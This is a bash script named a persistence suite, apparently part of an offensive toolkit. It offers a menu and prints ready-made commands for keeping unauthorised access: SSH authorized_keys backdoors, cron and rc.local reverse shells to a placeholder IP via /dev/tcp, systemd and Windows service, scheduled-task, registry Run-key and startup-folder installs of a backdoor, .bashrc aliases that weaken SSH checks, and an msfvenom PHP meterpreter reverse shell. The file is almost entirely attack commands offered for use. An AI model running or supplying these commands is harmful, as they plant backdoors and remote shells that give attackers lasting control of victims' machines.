#!/bin/bash

#############################################################################
#                                                                           #
#  PERSISTENCE SUITE                                                       #
#  Phase 8: Maintain access across reboots and logouts                      #
#                                                                           #
#  Includes:                                                               #
#  - Backdoors                                                            #
#  - Scheduled tasks/jobs                                                  #
#  - Service installation                                                 #
#  - SSH keys                                                             #
#                                                                           #
#############################################################################

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║              PERSISTENCE SUITE                                           ║
║              Phase 8: Maintain access across reboots/logouts               ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  PERSISTENCE${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Linux Persistence${NC}"
    echo "   P1.  SSH Backdoor Keys"
    echo "   P2.  Cron Job Persistence"
    echo "   P3.  Systemd Service"
    echo "   P4.  rc.local Persistence"
    echo "   P5.  .bashrc Backdoor"
    echo ""
    echo -e "${YELLOW}Windows Persistence${NC}"
    echo "   PW1. Scheduled Task"
    echo "   PW2. Registry Run Keys"
    echo "   PW3. Service Installation"
    echo "   PW4. Startup Folder"
    echo "   PW5. WMI Event Subscription"
    echo ""
    echo -e "${YELLOW}Web Shells${NC}"
    echo "   PWS1. PHP Web Shell"
    echo "   PWS2. ASP Web Shell"
    echo "   PWS3. JSP Web Shell"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    P1                      SSH backdoor keys
    PW1                     Scheduled task (Windows)
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 P1
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift
    
    case "$choice" in
        P1|p1)
            log_info "SSH Backdoor Keys"
            echo "mkdir -p ~/.ssh"
            echo "echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys"
            ;;
        P2|p2)
            log_info "Cron Job Persistence"
            echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &'"
            echo "(crontab -l ; echo '@reboot /path/to/backdoor') | crontab -"
            ;;
        P3|p3)
            log_info "Systemd Service"
            echo "[Unit]"
            echo "Description=Service"
            echo "[Service]"
            echo "Type=oneshot"
            echo "ExecStart=/path/to/backdoor"
            echo "[Install]"
            echo "WantedBy=multi-user.target"
            ;;
        P4|p4)
            log_info "rc.local Persistence"
            echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &'"
            ;;
        P5|p5)
            log_info ".bashrc Backdoor"
            echo "alias ssh='ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no'"
            echo "alias sudo='sudo -i'"
            ;;
        PW1)
            log_info "Windows Scheduled Task"
            echo "schtasks /create /sc minute /mo 1 /tn \"MyTask\" /tr \"C:\\path\\to\\backdoor.exe\""
            ;;
        PW2)
            log_info "Windows Registry Run Keys"
            echo "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MyBackdoor\" /t REG_SZ /d \"C:\\path\\to\\backdoor.exe\" /f"
            ;;
        PW3)
            log_info "Windows Service Installation"
            echo "sc create MyService binPath= \"C:\\path\\to\\backdoor.exe\" start= auto"
            echo "sc start MyService"
            ;;
        PW4)
            log_info "Windows Startup Folder"
            echo "copy backdoor.exe \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
            ;;
        PWS1)
            log_info "PHP Web Shell"
            echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw > shell.php"
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
